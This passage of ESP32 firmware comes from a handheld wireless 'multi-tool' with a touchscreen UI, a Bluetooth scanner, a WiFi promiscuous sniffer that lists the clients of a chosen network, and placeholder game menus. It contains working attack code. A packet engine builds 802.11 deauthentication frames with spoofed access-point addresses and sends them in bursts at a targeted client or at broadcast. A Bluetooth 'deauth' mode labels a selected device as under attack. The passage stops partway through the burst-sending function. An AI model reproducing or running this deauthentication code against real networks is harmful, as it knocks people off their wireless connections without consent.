  int totalBtnWidth = BTN_W * 6 + BTN_GAP * 5;
  int startX = (SCREEN_W - totalBtnWidth) / 2;
  
  drawBtn(startX, BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(startX + (BTN_W + BTN_GAP), BTN_Y, BTN_W, "LEFT",   C_GREEN);
  drawBtn(startX + (BTN_W + BTN_GAP) * 2, BTN_Y, BTN_W, "RIGHT",  C_GREEN);
  drawBtn(startX + (BTN_W + BTN_GAP) * 3, BTN_Y, BTN_W, "ROTATE", C_GREEN);
  drawBtn(startX + (BTN_W + BTN_GAP) * 4, BTN_Y, BTN_W, "DROP",   C_ORANGE);
  drawBtn(startX + (BTN_W + BTN_GAP) * 5, BTN_Y, BTN_W, "STOP",   C_RED);
  
  tft.fillRect(CONN_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(CLIENT_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(SCAN_X, BTN_Y, BTN_W, BTN_H, C_BG);
}

// ============================================================
//  GALAGA FUNCTIONS
// ============================================================
void initGalaga() {
  galagaState = GALAGA_STATE_PLAYING;
}

void drawGalaga() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W + RADAR_PANEL_W, LIST_H, C_BG);
  
  tft.setTextColor(C_CYAN, C_BG);
  tft.setTextSize(3);
  tft.setCursor(150, 120);
  tft.print("GALAGA");
  
  tft.setTextSize(2);
  tft.setTextColor(C_GREEN, C_BG);
  tft.setCursor(120, 170);
  tft.print("Coming Soon!");
  
  tft.setTextSize(1);
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(100, 210);
  tft.print("Press HOME for menu");
}

void updateGalaga() {
  // Galaga game logic will go here
}

void drawGalagaButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
  int totalBtnWidth = BTN_W * 3 + BTN_GAP * 2;
  int startX = (SCREEN_W - totalBtnWidth) / 2;
  
  drawBtn(startX, BTN_Y, BTN_W, "HOME", C_CYAN);
  drawBtn(startX + (BTN_W + BTN_GAP), BTN_Y, BTN_W, "START", C_GREEN);
  drawBtn(startX + (BTN_W + BTN_GAP) * 2, BTN_Y, BTN_W, "STOP", C_RED);
  
  tft.fillRect(PREV_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(NEXT_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(SEL_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(DEAUTH_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(CONN_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(CLIENT_X, BTN_Y, BTN_W, BTN_H, C_BG);
  tft.fillRect(SCAN_X, BTN_Y, BTN_W, BTN_H, C_BG);
}

// ============================================================
//  BLUETOOTH SCANNER
// ============================================================

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (totalBTDevices >= MAX_BT_DEVICES) return;
    
    String address = advertisedDevice.getAddress().toString().c_str();
    String name = advertisedDevice.getName().c_str();
    if (name.length() == 0) name = "<Unknown>";
    int rssi = advertisedDevice.getRSSI();
    bool isRandom = (advertisedDevice.getAddressType() & 0x01);
    
    for (int i = 0; i < totalBTDevices; i++) {
      if (btDevices[i].address == address) {
        btDevices[i].rssi = rssi;
        btDevices[i].lastSeen = millis();
        btDevices[i].name = name;
        
        float newDist = (float)map(constrain(rssi, -90, -30), -90, -30, 90, 20) / 100.0f;
        if (abs(newDist - btDevices[i].radarDist) > 0.1) {
          btDevices[i].radarDist = newDist;
        }
        return;
      }
    }
    
    int idx = totalBTDevices;
    btDevices[idx].address = address;
    btDevices[idx].name = name;
    btDevices[idx].rssi = rssi;
    btDevices[idx].isRandom = isRandom;
    btDevices[idx].lastSeen = millis();
    btDevices[idx].hitTime = 0;
    btDevices[idx].targeted = false;
    btDevices[idx].pktCount = 0;
    btDevices[idx].addrType = advertisedDevice.getAddressType();
    
    uint8_t* mac = (uint8_t*)advertisedDevice.getAddress().getNative();
    float baseAngle = (360.0f / MAX_BT_DEVICES) * idx;
    float jitter = ((mac[4]*7 + mac[5]*3) % 40) - 20.0f;
    btDevices[idx].radarAngle = baseAngle + jitter;
    if (btDevices[idx].radarAngle < 0) btDevices[idx].radarAngle += 360.0f;
    if (btDevices[idx].radarAngle >= 360) btDevices[idx].radarAngle -= 360.0f;
    
    btDevices[idx].radarDist = (float)map(constrain(rssi, -90, -30), -90, -30, 90, 20) / 100.0f;
    
    totalBTDevices++;
    
    for (int i = totalBTDevices - 1; i > 0; i--) {
      if (btDevices[i].rssi > btDevices[i-1].rssi) {
        BTDeviceInfo temp = btDevices[i];
        btDevices[i] = btDevices[i-1];
        btDevices[i-1] = temp;
      }
    }
    
    assignBTRadarPositions();
  }
};

void assignBTRadarPositions() {
  for (int i = 0; i < totalBTDevices; i++) {
    float baseAngle = (360.0f / max(totalBTDevices, 1)) * i;
    uint8_t* mac = (uint8_t*)btDevices[i].address.c_str();
    float jitter = ((mac[4]*7 + mac[5]*3) % 40) - 20.0f;
    btDevices[i].radarAngle = baseAngle + jitter;
    if (btDevices[i].radarAngle < 0) btDevices[i].radarAngle += 360.0f;
    if (btDevices[i].radarAngle >= 360) btDevices[i].radarAngle -= 360.0f;
    
    btDevices[i].radarDist = (float)map(constrain(btDevices[i].rssi, -90, -30), -90, -30, 90, 20) / 100.0f;
    btDevices[i].hitTime = 0;
  }
}

void startBTScan() {
  if (!isBluetoothRadioAvailable()) {
    Serial.println("[BT] Radio not active, switching...");
    requestRadioModeSwitch(RADIO_MODE_BT);
    handleRadioModeSwitch();
    delay(500);
  }

  if (btScanning) return;
  
  if (deauthRunning) stopDeauth();
  if (snifferRunning) stopSniffer();
  if (pcap.isCapturing) stopPCAPCapture();
  
  WiFi.mode(WIFI_OFF);
  delay(100);
  
  showMessage("Starting BT scan...", 500);
  
  if (!pBLEScan) {
    BLEDevice::init("");
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
  }
  
  totalBTDevices = 0;
  btScanning = true;
  btScanStartTime = millis();
  scanComplete = false;
  selectedBTIndex = -1;
  currentBTIndex = 0;
  
  pBLEScan->start(0, nullptr, false);
  
  Serial.println("[+] Bluetooth scan started");
}

void stopBTScan() {
  if (pBLEScan && btScanning) {
    pBLEScan->stop();
  }
  btScanning = false;
  scanComplete = true;
  assignBTRadarPositions();
  
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  
  Serial.println("[+] Bluetooth scan stopped");
}

void prevBTDevice() {
  if (totalBTDevices == 0) return;
  currentBTIndex--;
  if (currentBTIndex < 0) currentBTIndex = totalBTDevices - 1;
  displayBTScanner();
}

void nextBTDevice() {
  if (totalBTDevices == 0) return;
  currentBTIndex++;
  if (currentBTIndex >= totalBTDevices) currentBTIndex = 0;
  displayBTScanner();
}

void selectBTDevice() {
  if (totalBTDevices == 0) return;
  
  if (selectedBTIndex == currentBTIndex) {
    selectedBTIndex = -1;
    btDevices[currentBTIndex].targeted = false;
    showMessage("Device deselected", 500);
  } else {
    if (selectedBTIndex >= 0) {
      btDevices[selectedBTIndex].targeted = false;
    }
    selectedBTIndex = currentBTIndex;
    btDevices[currentBTIndex].targeted = true;
    showMessage("Device selected: " + btDevices[currentBTIndex].name, 1000);
  }
  displayBTScanner();
}

void sendBTDeauthPacket(uint8_t* targetMAC) {
  esp_ble_adv_data_t advData;
  advData.set_scan_rsp = false;
  advData.include_name = true;
  advData.include_txpower = true;
  advData.min_interval = 0x20;
  advData.max_interval = 0x20;
  advData.appearance = 0x00;
  advData.manufacturer_len = 0;
  advData.p_manufacturer_data = NULL;
  advData.service_data_len = 0;
  advData.p_service_data = NULL;
  advData.service_uuid_len = 0;
  advData.p_service_uuid = NULL;
  advData.flag = 0x06;
  
  esp_ble_gap_config_adv_data(&advData);
  
  esp_ble_adv_params_t advParams;
  advParams.adv_int_min = 0x20;
  advParams.adv_int_max = 0x20;
  advParams.adv_type = ADV_TYPE_IND;
  advParams.own_addr_type = BLE_ADDR_TYPE_PUBLIC;
  advParams.channel_map = ADV_CHNL_ALL;
  advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
  
  esp_ble_gap_start_advertising(&advParams);
  delay(1);
  esp_ble_gap_stop_advertising();
}

void startBTDeauth() {
  if (selectedBTIndex < 0 && totalBTDevices == 0) {
    showMessage("Select a device first!", 1000);
    return;
  }
  
  int targetIdx = (selectedBTIndex >= 0) ? selectedBTIndex : currentBTIndex;
  
  totalBTPackets = 0;
  btActualRate = 0;
  btPeakRate = 0;
  btPacketsThisSecond = 0;
  btAttackStartTime = millis();
  
  btDeauthRunning = true;
  
  String targetName = btDevices[targetIdx].name;
  showMessage("Attacking: " + targetName, 1000);
  
  Serial.printf("[+] BT Deauth attack started on: %s [%s]\n", 
    targetName.c_str(), btDevices[targetIdx].address.c_str());
    
  displayBTScanner();
}

void stopBTDeauth() {
  if (!btDeauthRunning) {
    showMessage("No attack running", 500);
    return;
  }
  
  btDeauthRunning = false;
  
  Serial.printf("[+] BT Attack stopped. Total packets: %lu\n", totalBTPackets);
  showMessage("Attack stopped", 1000);
  displayBTScanner();
}

void updateBTAttackOverlay() {
  if (!btDeauthRunning) return;
  
  unsigned long rt = (millis() - btAttackStartTime) / 1000;
  int oy = RADAR_PANEL_Y + RADAR_PANEL_H - 22;
  tft.fillRect(RADAR_PANEL_X + 2, oy, RADAR_PANEL_W - 4, 16, C_BG);
  tft.setTextColor(C_RED, C_BG); tft.setTextSize(1);
  tft.setCursor(RADAR_PANEL_X + 6, oy + 4);
  tft.printf("BT ATK:%lu  %d/s  %02lu:%02lu", totalBTPackets, btActualRate, rt/60, rt%60);
}

void drawBTRadarPanelFrame() {
  tft.fillRect(RADAR_PANEL_X, RADAR_PANEL_Y, RADAR_PANEL_W, RADAR_PANEL_H, C_BG);

  tft.setTextSize(1);
  tft.setCursor(RADAR_PANEL_X + 4, RADAR_PANEL_Y + 4);
  
  if (btDeauthRunning) {
    tft.setTextColor(C_RED, C_BG);
    tft.print(">> BT ATTACKING <<");
  } else if (btScanning) {
    tft.setTextColor(C_GREEN, C_BG);
    tft.print("BT SCANNING");
  } else {
    tft.setTextColor(C_CYAN, C_BG);
    tft.print("BT RADAR");
  }
  
  tft.setCursor(RADAR_PANEL_X + RADAR_PANEL_W - 70, RADAR_PANEL_Y + 4);
  if (btScanning) {
    tft.setTextColor(C_GREEN, C_BG);
    tft.print("SCANNING");
  } else {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.print("IDLE");
  }

  drawRadarGrid();

  if (totalBTDevices > 0) {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setCursor(RADAR_PANEL_X + 4, RADAR_PANEL_Y + RADAR_PANEL_H - 14);
    tft.printf("Devices: %d", totalBTDevices);
    
    if (selectedBTIndex >= 0) {
      tft.setCursor(RADAR_PANEL_X + 100, RADAR_PANEL_Y + RADAR_PANEL_H - 14);
      tft.setTextColor(C_RED, C_BG);
      tft.print("TARGET");
    }
  }
}

void updateBTRadarSweep() {
  unsigned long now = millis();

  float eraseAngle = sweepAngle - 2.0f;
  if (eraseAngle < 0) eraseAngle += 360.0f;
  drawSweepLine(eraseAngle, C_BG);

  for (int t = 1; t <= TRAIL_STEPS; t++) {
    float ta = sweepAngle - t * (180.0f / TRAIL_STEPS);
    if (ta < 0) ta += 360.0f;
    uint16_t tc;
    if (t < TRAIL_STEPS/3)        tc = C_GREEN_DIM;
    else if (t < TRAIL_STEPS*2/3) tc = C_GREEN_DARK;
    else                           tc = C_GREEN_FADE;
    drawSweepLine(ta, tc);
  }

  drawSweepLine(sweepAngle, C_GREEN);

  for (int i = 0; i < totalBTDevices; i++) {
    float diff = fabs(sweepAngle - btDevices[i].radarAngle);
    if (diff > 180) diff = 360 - diff;
    if (diff < SWEEP_SPEED + 1.0f) btDevices[i].hitTime = now;
  }

  for (int i = 0; i < totalBTDevices; i++) {
    if (btDevices[i].hitTime == 0) continue;
    
    unsigned long age = now - btDevices[i].hitTime;
    uint16_t col;
    
    bool isSel = (i == selectedBTIndex);
    bool isCur = (i == currentBTIndex);
    
    if (btDeauthRunning && isSel) {
      col = (now/200 % 2) ? C_RED : C_ORANGE;
    } else if (isSel) {
      col = C_RED;
    } else if (isCur) {
      col = C_YELLOW;
    } else if (age < 800) {
      col = sigColor(btDevices[i].rssi);
    } else if (age < 1800) {
      col = C_GREEN_DIM;
    } else if (age < 3000) {
      col = C_GREEN_DARK;
    } else {
      continue;
    }
    
    bool bigBlip = (btDevices[i].rssi > -60) || isSel || isCur;
    
    drawRadarBlip(i, btDevices[i].radarAngle, btDevices[i].radarDist, col, bigBlip);
  }

  tft.fillCircle(RADAR_CX, RADAR_CY, 3, C_CYAN);

  sweepAngle += SWEEP_SPEED;
  if (sweepAngle >= 360.0f) sweepAngle -= 360.0f;
}

void displayBTScanner() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W, LIST_H, C_BG);
  
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(1);
  tft.setCursor(LIST_X + 6, LIST_Y + 6);
  tft.print("BLUETOOTH DEVICES");
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(LIST_X + 180, LIST_Y + 6);
  tft.printf("%d", totalBTDevices);
  
  if (selectedBTIndex >= 0) {
    tft.setTextColor(C_RED, C_BG);
    tft.setCursor(LIST_X + 6, LIST_Y + 16);
    tft.print("TARGET: " + btDevices[selectedBTIndex].name.substring(0, 12));
  }
  
  tft.setCursor(LIST_X + 6, LIST_Y + 26);
  if (btScanning) {
    int elapsed = (millis() - btScanStartTime) / 1000;
    tft.setTextColor(C_GREEN, C_BG);
    tft.print("SCANNING... " + String(elapsed) + "s");
    
    int barW = 150;
    int filled = map(constrain(elapsed, 0, 5), 0, 5, 0, barW);
    tft.drawRect(LIST_X + 6, LIST_Y + 38, barW, 8, C_GREEN_DARK);
    tft.fillRect(LIST_X + 6, LIST_Y + 38, filled, 8, C_GREEN);
  } else {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.print("Press SCAN to start");
  }
  
  tft.drawFastHLine(LIST_X, LIST_Y + LIST_HEADER_H + 20, LIST_W, C_GREEN_DARK);
  
  if (totalBTDevices == 0) {
    if (!btScanning) {
      tft.setTextColor(C_GREEN_DARK, C_BG);
      tft.setCursor(LIST_X + 30, LIST_Y + 120);
      tft.print("No devices found");
      tft.setCursor(LIST_X + 30, LIST_Y + 140);
      tft.print("Press SCAN to scan");
    }
    tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
    drawBTRadarPanelFrame();
    return;
  }
  
  int maxRows = 7;
  int startIdx = currentBTIndex - maxRows/2;
  if (startIdx < 0) startIdx = 0;
  if (startIdx > totalBTDevices - maxRows) startIdx = max(0, totalBTDevices - maxRows);
  
  for (int row = 0; row < maxRows && (startIdx+row) < totalBTDevices; row++) {
    int idx = startIdx + row;
    int y = LIST_Y + LIST_HEADER_H + 40 + row * 30;
    
    bool isCurrent = (idx == currentBTIndex);
    bool isSelected = (idx == selectedBTIndex);
    
    if (isCurrent) {
      tft.fillRect(LIST_X, y-2, LIST_W, 28, C_GREEN_DARK);
    }
    
    if (btDevices[idx].isRandom) {
      tft.setTextColor(C_YELLOW, isCurrent ? C_GREEN_DARK : C_BG);
      tft.setCursor(LIST_X + 4, y);
      tft.print("R");
    } else {
      tft.setTextColor(C_GREEN, isCurrent ? C_GREEN_DARK : C_BG);
      tft.setCursor(LIST_X + 4, y);
      tft.print("P");
    }
    
    if (isSelected) {
      tft.setTextColor(C_RED, isCurrent ? C_GREEN_DARK : C_BG);
    } else {
      tft.setTextColor(isCurrent ? C_YELLOW : C_CYAN, isCurrent ? C_GREEN_DARK : C_BG);
    }
    tft.setCursor(LIST_X + 18, y);
    String name = btDevices[idx].name;
    if (name.length() > 14) name = name.substring(0, 13) + "~";
    tft.print(name);
    
    if (btDeauthRunning && isSelected) {
      tft.setCursor(LIST_X + 140, y);
      tft.setTextColor(C_RED, isCurrent ? C_GREEN_DARK : C_BG);
      tft.print("⚡");
    }
    
    tft.setTextColor(sigColor(btDevices[idx].rssi), isCurrent ? C_GREEN_DARK : C_BG);
    tft.setCursor(LIST_X + 160, y);
    tft.printf("%d", btDevices[idx].rssi);
    
    tft.setTextColor(C_GREEN_DIM, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setCursor(LIST_X + 18, y + 10);
    String addr = btDevices[idx].address;
    tft.print(addr.substring(0, 15));
    
    tft.drawFastHLine(LIST_X, y + 24, LIST_W, C_GREEN_DARK);
  }
  
  tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
  
  drawBTRadarPanelFrame();
  
  if (btDeauthRunning) {
    updateBTAttackOverlay();
  }
  
  for (int i = 0; i < totalBTDevices; i++) {
    btDevices[i].radarDist = (float)map(constrain(btDevices[i].rssi, -90, -30), -90, -30, 90, 20) / 100.0f;
  }
}

void drawBTButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
  bool hasDevices = (totalBTDevices > 0);
  
  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "PREV",   hasDevices ? C_GREEN : C_GREEN_DARK);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "NEXT",   hasDevices ? C_GREEN : C_GREEN_DARK);
  drawBtn(SEL_X,     BTN_Y, BTN_W, "SEL",    hasDevices ? (selectedBTIndex>=0 ? C_GREEN : C_GREEN_DIM) : C_GREEN_DARK);
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, "DEAUTH", btDeauthRunning ? C_RED : (hasDevices ? C_ORANGE : C_GREEN_DARK));
  drawBtn(STOP_X,    BTN_Y, BTN_W, "STOP",   btDeauthRunning ? C_RED : C_GREEN_DARK);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "CONN",   C_GREEN_DARK);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "CLIENT", C_GREEN_DARK);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "SCAN",   btScanning ? C_RED : C_GREEN);
}

// ============================================================
//  MAIN MENU
// ============================================================
void drawMainMenu() {
  tft.fillScreen(C_BG);
  
  tft.setTextColor(C_GREEN, C_BG); 
  tft.setTextSize(1);
  tft.setCursor(4, 3);
  tft.print("ESP32 v1.1 - MAIN MENU");
  tft.setTextColor(C_GREEN_DARK, C_BG);
  tft.setCursor(260, 3);
  tft.print("OWL");
  tft.drawFastHLine(0, HEADER_H-1, SCREEN_W, C_GREEN);
  
  int menuY = 40;
  int menuH = 50;
  int menuW = 360;
  int menuX = (SCREEN_W - menuW) / 2;
  
  tft.drawRect(menuX, menuY, menuW, menuH, C_GREEN);
  tft.fillRect(menuX+2, menuY+2, menuW-4, menuH-4, C_BG);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(2);
  tft.setCursor(menuX + 100, menuY + 15);
  tft.print("WiFi Scanner");
  
  menuY += menuH + 10;
  tft.drawRect(menuX, menuY, menuW, menuH, C_GREEN);
  tft.fillRect(menuX+2, menuY+2, menuW-4, menuH-4, C_BG);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(2);
  tft.setCursor(menuX + 70, menuY + 15);
  tft.print("Bluetooth Scanner");
  
  menuY += menuH + 10;
  tft.drawRect(menuX, menuY, menuW, menuH, C_GREEN);
  tft.fillRect(menuX+2, menuY+2, menuW-4, menuH-4, C_BG);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(2);
  tft.setCursor(menuX + 100, menuY + 15);
  tft.print("PCAP Capture");
  
  menuY += menuH + 10;
  tft.drawRect(menuX, menuY, menuW, menuH, C_GREEN);
  tft.fillRect(menuX+2, menuY+2, menuW-4, menuH-4, C_BG);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(2);
  tft.setCursor(menuX + 130, menuY + 15);
  tft.print("GAMES");
  
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setTextSize(1);
  tft.setCursor(140, 290);
  tft.print("Tap to select");
}

void drawGamesMenu() {
  tft.fillScreen(C_BG);
  
  tft.setTextColor(C_GREEN, C_BG); 
  tft.setTextSize(1);
  tft.setCursor(4, 3);
  tft.print("ESP32 MULTI-TOOL v1.1 - GAMES MENU");
  tft.setTextColor(C_GREEN_DARK, C_BG);
  tft.setCursor(260, 3);
  tft.print("SELECT GAME");
  tft.drawFastHLine(0, HEADER_H-1, SCREEN_W, C_GREEN);
  
  int menuY = 70;
  int menuH = 70;
  int menuW = 360;
  int menuX = (SCREEN_W - menuW) / 2;
  
  tft.drawRect(menuX, menuY, menuW, menuH, C_GREEN);
  tft.fillRect(menuX+2, menuY+2, menuW-4, menuH-4, C_BG);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(3);
  tft.setCursor(menuX + 100, menuY + 22);
  tft.print("GALAGA");
  
  menuY += menuH + 20;
  tft.drawRect(menuX, menuY, menuW, menuH, C_GREEN);
  tft.fillRect(menuX+2, menuY+2, menuW-4, menuH-4, C_BG);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(3);
  tft.setCursor(menuX + 120, menuY + 22);
  tft.print("TETRIS");
  
  menuY += menuH + 20;
  tft.drawRect(menuX, menuY, menuW, 50, C_GREEN);
  tft.fillRect(menuX+2, menuY+2, menuW-4, 46, C_BG);
  tft.setTextColor(C_GREEN_DIM, C_BG); tft.setTextSize(2);
  tft.setCursor(menuX + 120, menuY + 15);
  tft.print("BACK TO MAIN");
  
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setTextSize(2);
  tft.setCursor(140, 280);
  tft.print("Tap to select game");
}

void drawMainMenuButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  drawBtn(HOME_X, BTN_Y, BTN_W, "HOME", C_CYAN);
  drawBtn(PREV_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(NEXT_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(SEL_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(DEAUTH_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(STOP_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(CONN_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(CLIENT_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(SCAN_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
}

void drawGamesMenuButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  drawBtn(HOME_X, BTN_Y, BTN_W, "HOME", C_CYAN);
  drawBtn(PREV_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(NEXT_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(SEL_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(DEAUTH_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(STOP_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(CONN_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(CLIENT_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(SCAN_X, BTN_Y, BTN_W, "", C_GREEN_DARK);
}

// ============================================================
//  SNIFFER (WiFi only)
// ============================================================
void IRAM_ATTR snifferCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (totalClients >= MAX_CLIENTS) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (pkt->rx_ctrl.sig_len < 24) return;

  const uint8_t* payload = pkt->payload;
  uint8_t frameType    = payload[0] & 0x0C;
  uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;

  if (frameType == 0x00 && (frameSubtype == 0x0C || frameSubtype == 0x0A)) return;

  const uint8_t* addr1 = payload + 4;
  const uint8_t* addr2 = payload + 10;
  const uint8_t* addr3 = payload + 16;

  const uint8_t* clientMAC = NULL;
  bool isFromSelectedNetwork = false;

  if (frameType == 0x00) {
    if (memcmp(addr3, sniffBSSID, 6) == 0) {
      isFromSelectedNetwork = true;
      if (memcmp(addr1, sniffBSSID, 6) != 0 && !(addr1[0] & 0x01)) clientMAC = addr1;
      else if (memcmp(addr2, sniffBSSID, 6) != 0 && !(addr2[0] & 0x01)) clientMAC = addr2;
    }
  } else if (frameType == 0x08) {
    uint8_t toDS   = (payload[1] & 0x01);
    uint8_t fromDS = (payload[1] & 0x02) >> 1;

    if (toDS && !fromDS) {
      if (memcmp(addr1, sniffBSSID, 6) == 0) {
        isFromSelectedNetwork = true;
        if (!(addr2[0] & 0x01)) clientMAC = addr2;
      }
    } else if (!toDS && fromDS) {
      if (memcmp(addr2, sniffBSSID, 6) == 0) {
        isFromSelectedNetwork = true;
        if (!(addr1[0] & 0x01)) clientMAC = addr1;
      }
    } else if (!toDS && !fromDS) {
      if (memcmp(addr3, sniffBSSID, 6) == 0) {
        isFromSelectedNetwork = true;
        if (memcmp(addr1, sniffBSSID, 6) != 0 && !(addr1[0] & 0x01)) clientMAC = addr1;
      }
    }
  }

  if (!isFromSelectedNetwork || !clientMAC) return;

  if (clientMAC[0] & 0x01) return;
  if (memcmp(clientMAC, sniffBSSID, 6) == 0) return;
  uint8_t zero[6] = {0};
  if (memcmp(clientMAC, zero, 6) == 0) return;

  portENTER_CRITICAL_ISR(&snifferMux);

  for (int i = 0; i < totalClients; i++) {
    if (memcmp(clients[i].mac, clientMAC, 6) == 0) {
      clients[i].pktCount++;
      clients[i].rssi = pkt->rx_ctrl.rssi;
      clients[i].lastSeen = millis();
      portEXIT_CRITICAL_ISR(&snifferMux);
      return;
    }
  }

  if (totalClients < MAX_CLIENTS) {
    int idx = totalClients;
    memcpy(clients[idx].mac, clientMAC, 6);
    char ms[18];
    sprintf(ms, "%02X:%02X:%02X:%02X:%02X:%02X",
      clientMAC[0], clientMAC[1], clientMAC[2],
      clientMAC[3], clientMAC[4], clientMAC[5]);
    clients[idx].macStr   = String(ms);
    clients[idx].rssi     = pkt->rx_ctrl.rssi;
    clients[idx].pktCount = 1;
    clients[idx].targeted = false;
    clients[idx].lastSeen = millis();
    memcpy(clients[idx].oui, clientMAC, 3);
    totalClients++;
  }

  portEXIT_CRITICAL_ISR(&snifferMux);
}

bool startSniffer(int channel, uint8_t* bssid, String ssid) {
  if (btScanning) stopBTScan();
  if (btDeauthRunning) stopBTDeauth();
  if (pcap.isCapturing) stopPCAPCapture();
  
  if (!bssid) return false;

  memcpy(sniffBSSID, bssid, 6);
  sniffSSID = ssid;

  portENTER_CRITICAL(&snifferMux);
  totalClients = 0; 
  clientViewIndex = 0; 
  selectedClientIdx = -1;
  portEXIT_CRITICAL(&snifferMux);

  esp_wifi_set_promiscuous(false);
  delay(50);

  WiFi.disconnect(true, true);
  delay(100);
  WiFi.mode(WIFI_STA);
  delay(200);
  silenceLogs();

  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&snifferCB);

  if (esp_wifi_set_promiscuous(true) != ESP_OK) {
    Serial.println("[-] Promiscuous mode failed!");
    return false;
  }

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  silenceLogs();
  snifferRunning = true;
  
  Serial.printf("[+] SNIFFER ACTIVE - Network Isolation ENABLED\n");
  Serial.printf("    Selected Network: %s (CH:%d)\n", ssid.c_str(), channel);
  
  return true;
}

void stopSniffer() {
  esp_wifi_set_promiscuous(false);
  snifferRunning = false;
  silenceLogs();
  Serial.println("[+] Sniffer OFF - Network isolation disabled");
}

// ============================================================
//  PACKET ENGINE (WiFi only)
// ============================================================
void buildDeauthFrame(uint8_t* buf, uint8_t* dst, uint8_t* bssid, uint16_t seq) {
  if (!buf||!dst||!bssid) return;
  memset(buf, 0, PKT_SIZE);
  buf[0]=0xC0; buf[1]=0x00;
  buf[2]=0x3A; buf[3]=0x01;
  memcpy(&buf[4],  dst,   6);
  memcpy(&buf[10], bssid, 6);
  memcpy(&buf[16], bssid, 6);
  buf[22] = (seq & 0x0F) << 4;
  buf[23] = (seq >> 4) & 0xFF;
  buf[24] = 0x07; buf[25] = 0x00;
}

bool buildDeauthPackets(uint8_t* bssid, uint8_t* clientMAC) {
  if (!bssid) return false;
  pktsBuilt = false;
  uint8_t* target = clientMAC ? clientMAC : broadcastMA;
  for (int i = 0; i < PKT_BURST; i++) {
    uint16_t seq = seqNum + i;
    buildDeauthFrame(pktAP[i], target, bssid, seq);
    if (clientMAC) buildDeauthFrame(pktCL[i], bssid, clientMAC, seq + PKT_BURST);
  }
  seqNum += PKT_BURST * 2; pktsBuilt = true; return true;
}

void sendBurst() {
  if (!pktsBuilt) return;
  for (int i = 0; i < PKT_BURST; i++) {
